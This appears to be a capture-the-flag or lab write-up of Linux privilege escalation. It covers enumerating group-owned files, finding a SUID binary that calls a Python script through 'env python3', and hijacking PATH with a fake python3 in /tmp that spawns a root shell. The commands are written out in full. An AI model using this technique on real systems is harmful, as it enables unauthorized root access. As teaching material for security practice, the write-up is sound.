
The session began with access as **ronnie.stone**, who is a member of the **bankers** group. The goal was to identify and exploit misconfigurations for **root escalation**.

---

### Initial Enumeration

|Command|Finding / Observation|
|---|---|
|`ls -la`|Nothing notable in the home directory.|
|`sudo -l`|Prompted for a password (unknown).|

Since direct `sudo` access was unavailable, the focus shifted to **files accessible by the bankers group** that could be exploited.

---

### Locating the Privileged Binary

A search was performed for files owned by the **bankers** group:

```bash
find / -group bankers 2>/dev/null
```

- **Identified Binary:** `/usr/local/bin/bank_backupd`
    

Check permissions:

```bash
ls -la /usr/local/bin/bank_backupd
```

- Output showed: `-rwsr-x--- 1 root bankers 16192 ...`
    
- **Observation:** The **SUID** bit (`s`) is set. Execution runs with **root** privileges.
    

---

### Analyzing the SUID Binary

Execute the binary:

```bash
/usr/local/bin/bank_backupd
```

- Output indicated the binary performs tasks such as connecting to the ledger and verifying transaction logs.
    
- Notably, it calls a **Python script**: `bank_backup.py`.
    

Inspect the Python script:

```bash
cat /usr/local/bin/bank_backup.py
```

- Snippet:
    

```python
#!/usr/bin/env python3
import hashlib, time, os
print("[bank_backup.py] Running internal Python verification...")
time.sleep(1)
# ...rest of script
```

**Vulnerability Identified:**

- The SUID binary calls the script using `#!/usr/bin/env python3` without a full path.
    
- This **relies on the PATH environment variable**, allowing a **PATH hijack** attack.
    

---

### Exploiting the Python Path Hijack

**Attack Plan:**

1. Create a malicious executable named `python3` in a **writable directory**.
    
2. Add that directory to the **beginning of PATH**.
    
3. Execute the SUID binary. Since it runs as root, it will run the malicious `python3`.
    

**Steps:**

```bash
cd /tmp
echo '#!/bin/bash' > python3
echo '/bin/bash -p' >> python3
chmod +x python3
```

Execute the SUID binary with hijacked PATH:

```bash
PATH=/tmp:$PATH /usr/local/bin/bank_backupd
```

---

### Root Access Achieved

- Execution spawned a **root shell**:
    

```bash
whoami
root
```

- The machine was fully compromised.
    

---

### Summary

- Access as **ronnie.stone** leveraged the **bankers group** privileges.
    
- Found SUID binary: `/usr/local/bin/bank_backupd`.
    
- Discovered **PATH hijack vulnerability** via a Python script.
    
- Escalated to **root** using a malicious `python3` executable.
